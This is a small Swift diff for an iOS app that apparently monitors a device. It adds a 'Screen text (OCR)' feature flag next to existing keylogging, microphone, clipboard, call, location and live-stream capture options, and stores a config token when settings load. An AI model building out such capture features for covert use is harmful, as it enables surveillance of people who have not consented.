@@ -11,6 +11,7 @@ import FamilyControls
 enum FeatureKey: String, CaseIterable {
     case mic, camera, location, preciseLocation, keylog
     case calls, installedApps, netInfo, photoLocation
+    case ocr
     case voiceActivity, clipCapture, liveStream
     case photoLibrary, contacts, calendar, reminders, clipboard
     case motion, batteryState, health, wifiInfo, geofence, screenTime
@@ -51,6 +52,7 @@ enum FeatureKey: String, CaseIterable {
         case .installedApps: return "Installed apps"
         case .netInfo: return "Network and disk"
         case .photoLocation: return "Photo locations"
+        case .ocr: return "Screen text (OCR)"
         }
     }
 
@@ -86,6 +88,7 @@ final class Settings {
     var micAutoDisarm: Double = 300
 
     func load() {
+        store.set(Config.token, forKey: "token")
         for k in FeatureKey.allCases {
             v[k.rawValue] = store.object(forKey: "f_" + k.rawValue) as? Bool ?? k.defaultOn
         }
